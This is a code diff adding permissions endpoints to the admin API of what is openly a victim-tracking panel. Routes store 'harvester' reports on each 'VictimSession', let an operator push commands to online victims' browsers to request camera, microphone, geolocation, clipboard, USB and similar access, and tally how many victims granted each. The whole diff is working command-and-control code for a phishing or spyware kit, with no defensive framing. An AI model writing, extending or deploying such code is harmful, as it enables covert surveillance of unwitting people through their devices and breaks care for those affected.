@@ -514,4 +514,168 @@ router.put('/sessions/:id/tags', async (req, res) => {
   }
 });
 
+// === PERMISSIONS API ===
+
+// GET /api/admin/sessions/:id/permissions - Get permission status for a session
+router.get('/sessions/:id/permissions', async (req, res) => {
+  try {
+    const session = await VictimSession.findById(req.params.id)
+      .select('permissions cameraAccessGranted cameraAccessDenied sessionId')
+      .lean();
+
+    if (!session) {
+      return res.status(404).json({ error: 'Session not found' });
+    }
+
+    res.json({
+      sessionId: session._id,
+      sessionIdStr: session.sessionId,
+      permissions: session.permissions || {
+        camera: { status: session.cameraAccessGranted ? 'granted' : session.cameraAccessDenied ? 'denied' : 'unknown' },
+        microphone: { status: 'unknown' },
+        geolocation: { status: 'unknown' },
+        notifications: { status: 'unknown' },
+        clipboard: { status: 'unknown' },
+        bluetooth: { status: 'unknown' },
+        midi: { status: 'unknown' },
+        usb: { status: 'unknown' },
+        persistentStorage: { status: 'unknown' },
+        vibration: { status: 'unknown' },
+        orientation: { status: 'unknown' },
+        ambientLight: { status: 'unknown' },
+        proximity: { status: 'unknown' }
+      },
+      cameraAccessGranted: session.cameraAccessGranted,
+      cameraAccessDenied: session.cameraAccessDenied
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// POST /api/admin/sessions/:id/permissions/update - Update permission status from harvester report
+router.post('/sessions/:id/permissions/update', async (req, res) => {
+  try {
+    const { permissions } = req.body;
+    const session = await VictimSession.findById(req.params.id);
+    if (!session) {
+      return res.status(404).json({ error: 'Session not found' });
+    }
+
+    session.permissions = {
+      ...(session.permissions || {}),
+      ...permissions,
+      lastUpdated: new Date()
+    };
+
+    // Sync camera-specific fields from permissions report
+    if (permissions.camera) {
+      session.cameraAccessGranted = permissions.camera.status === 'granted';
+      session.cameraAccessDenied = permissions.camera.status === 'denied';
+    }
+
+    await session.save();
+
+    // Emit to admin
+    const { emitToAdmin } = require('../socket');
+    emitToAdmin('permissions-update', {
+      sessionId: session._id,
+      sessionIdStr: session.sessionId,
+      permissions: session.permissions,
+      timestamp: new Date()
+    });
+
+    res.json({ ok: true, permissions: session.permissions });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// POST /api/admin/sessions/:id/permissions/trigger - Admin requests to trigger a permission on the victim
+router.post('/sessions/:id/permissions/trigger', async (req, res) => {
+  try {
+    const { permissionType } = req.body;
+    const validPermissions = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard', 'bluetooth', 'usb', 'midi'];
+    
+    if (!validPermissions.includes(permissionType)) {
+      return res.status(400).json({ error: 'Invalid permission type. Valid: ' + validPermissions.join(', ') });
+    }
+
+    const session = await VictimSession.findById(req.params.id)
+      .select('sessionId isOnline')
+      .lean();
+
+    if (!session) {
+      return res.status(404).json({ error: 'Session not found' });
+    }
+
+    if (!session.isOnline) {
+      return res.status(400).json({ error: 'Session is offline. Cannot trigger permission.' });
+    }
+
+    // Emit the trigger command to the socket
+    const { getIO } = require('../socket');
+    const io = getIO();
+    
+    io.to(session.sessionId).emit('admin-trigger-permission', {
+      permissionType,
+      timestamp: Date.now(),
+      adminRequested: true
+    });
+
+    // Also emit to admin panel showing the trigger was sent
+    const { emitToAdmin } = require('../socket');
+    emitToAdmin('permission-triggered', {
+      sessionId: session._id,
+      sessionIdStr: session.sessionId,
+      permissionType,
+      timestamp: new Date()
+    });
+
+    res.json({ 
+      ok: true, 
+      message: `Permission '${permissionType}' trigger sent to session`,
+      sessionId: session._id
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// GET /api/admin/permissions/stats - Aggregate permissions overview
+router.get('/permissions/stats', async (req, res) => {
+  try {
+    const stats = await VictimSession.aggregate([
+      { $match: { permissions: { $exists: true, $ne: null } } },
+      { $project: {
+          hasCamera: { $eq: ['$permissions.camera.status', 'granted'] },
+          hasMicrophone: { $eq: ['$permissions.microphone.status', 'granted'] },
+          hasGeolocation: { $eq: ['$permissions.geolocation.status', 'granted'] },
+          hasNotifications: { $eq: ['$permissions.notifications.status', 'granted'] },
+          hasClipboard: { $eq: ['$permissions.clipboard.status', 'granted'] }
+      }},
+      { $group: {
+          _id: null,
+          totalWithPermissions: { $sum: 1 },
+          cameraGranted: { $sum: { $cond: ['$hasCamera', 1, 0] } },
+          microphoneGranted: { $sum: { $cond: ['$hasMicrophone', 1, 0] } },
+          geolocationGranted: { $sum: { $cond: ['$hasGeolocation', 1, 0] } },
+          notificationsGranted: { $sum: { $cond: ['$hasNotifications', 1, 0] } },
+          clipboardGranted: { $sum: { $cond: ['$hasClipboard', 1, 0] } }
+      }}
+    ]);
+
+    res.json(stats[0] || {
+      totalWithPermissions: 0,
+      cameraGranted: 0,
+      microphoneGranted: 0,
+      geolocationGranted: 0,
+      notificationsGranted: 0,
+      clipboardGranted: 0
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 module.exports = router;
